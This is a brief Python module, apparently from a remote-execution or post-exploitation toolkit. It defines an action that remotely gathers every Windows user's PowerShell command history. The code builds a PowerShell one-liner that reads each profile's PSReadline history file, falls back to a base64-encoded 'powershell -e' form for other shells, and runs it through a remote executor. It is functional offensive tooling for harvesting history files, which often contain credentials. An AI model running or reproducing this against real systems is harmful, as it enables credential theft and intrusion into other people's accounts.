# Local application/library specific imports
from .core.action import BaseAction
from .utils import common


class HistoryAction(BaseAction):
    DESCRIPTION = "Retrieve all users' shell command history"

    def run(self) -> str:
        """
        Retrieves command history for all users based on shell type.
        PowerShell: PSReadline history files
        CMD: doskey history and command prompt history files
        """

        powershell_command = r'foreach($user in ((ls C:\users | where-object { $_.Name -ne "Public" }).fullname)){echo "--- History of $user"; cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ea 0}'

        if self._os_helper.shell_type == "powershell":
            command = powershell_command
        else:
            command = (
                f"powershell -e {common.base64_for_powershell(powershell_command)}"
            )

        return self._executor.remote_execute(command)
